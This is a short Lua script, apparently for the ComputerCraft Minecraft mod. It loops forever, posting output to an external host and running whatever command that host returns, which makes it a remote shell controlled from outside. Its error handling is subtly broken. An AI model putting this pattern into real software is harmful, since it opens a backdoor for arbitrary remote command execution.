function exec()
  local output = "startup"

  while true do
    local f = http.post("http://l.ikno.ws:3000/resp", 
                "response=" .. textutils.urlEncode(tostring(output)))

    com = f.readAll()
    f.close()
      
    success, message = pcall(shell.run(com))
    if not success then output = message
    else output = "done" end
  end
end

exec()